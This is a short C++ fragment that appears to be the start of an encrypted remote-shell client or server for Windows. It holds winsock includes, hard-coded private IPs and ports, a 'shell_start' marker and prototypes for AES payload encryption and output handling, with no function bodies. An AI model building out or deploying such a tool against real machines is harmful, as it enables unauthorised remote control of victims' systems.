#include <iostream>
#include <string>
#include <winsock2.h>  
#include <thread>
#include "aes.h"

#define SERVER_PORT 54321
#define CLIENT_PORT 8888
#define SERVER_IP "192.168.124.1"
#define CLIENT_IP "192.168.124.212"
#define BUFFER_SIZE 1024
#define SHELL_START "shell_start"
AES_CONTEXT g_aes_ctx;

static void proc_output(SOCKET client_socket);
void encrypt_payload(const char* original_buf, char*& encrypt_buf, UINT& buf_len);
void decrypt_payload(const char* original_buf, char*& decrypt_buf, UINT buf_len);